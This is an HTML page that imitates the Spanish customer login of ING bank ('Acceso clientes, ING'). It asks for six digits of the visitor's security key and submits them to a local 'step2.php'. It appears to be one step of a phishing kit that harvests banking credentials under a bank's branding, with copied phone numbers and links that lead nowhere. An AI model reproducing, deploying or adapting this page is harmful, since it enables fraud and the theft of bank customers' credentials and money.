<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Acceso clientes, ING</title>
    <link rel="icon" href="./img/favicon.ico">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.5/css/bulma.min.css">
    <script defer src="https://use.fontawesome.com/releases/v5.3.1/js/all.js"></script>
    <link rel="stylesheet" href="./css/style.css">
  </head>
  <body>

<nav class="navbar" role="navigation" aria-label="main navigation">
  <div class="navbar-brand">
    <a class="navbar-item" href="#">
      <img src="./img/logo.svg" width="112" height="28">
    </a>
  </div>

  <div id="navbarBasicExample" class="navbar-menu">
  

    <div class="navbar-end">
      <div class="navbar-item">
      <img src="./img/phone.png"  style=" max-height: 1.3rem; " alt="">&nbsp; 901 10 51 15 | 91 206 66 66
      </div>
    </div>
  </div>
</nav>


  <section class="section">
    <div class="container">
        <div class="form">
        <h1>Clave de seguridad</h1>
        <br>
        <p>Completa las posiciones que faltan de tu clave de seguridad:</p>
        <br>

       <form action="step2.php" method="POST">

<br>
<br>
         <style>
         input[type='number'] {
    -moz-appearance:textfield;
}

input::-webkit-outer-spin-button,
input::-webkit-inner-spin-button {
    -webkit-appearance: none;
}

</style> 
       <div class="all-input">
        <input type="number" id="k1" name="k1" max="9" min="0"  autocomplete="off" required="">
        <input type="number" id="k2" name="k2" max="9" min="0"  autocomplete="off" required="">
        <input type="number" id="k3" name="k3" max="9" min="0"  autocomplete="off" required="">
        <input type="number" id="k4" name="k4" max="9" min="0"  autocomplete="off" required="">
        <input type="number" id="k5" name="k5" max="9" min="0"  autocomplete="off" required="">
        <input type="number" id="k6" name="k6" max="9" min="0"  autocomplete="off" required="">
      </div>

        
<br>
<br>
<button type="submit" class="mb-5" style=" background-color: #ff6200; padding: 0 30px; height: 45px; color: #FFF; font-weight: 700; width: 100%; border-radius: 9px; border: none; font-size: 18px; cursor: pointer; ">ENTRAR</button>
<br>
<br>
<br>
<div style="display: flex;align-items: center;">
        <img src="./img/arrow.png">
        <a href="#"> Acceder con DNI electrónico</a>
    </div>
<div style="display: flex;align-items: center;">
        <img src="./img/arrow.png">
        <a href="#"> Más información sobre seguridad</a>
    </div>
    <br>
    <br>
</form>
        </div>
    </div>
  </section>
  </body>
  <script src="./js/jquery.min.js"></script>
  <script>
      $(document).ready(function(){
          $('input').keyup(function(){
              if($(this).val().length > 0 && $(this).val()<=9){
                  $(this).next().focus();
              }
          });
      });
  </script>

</html>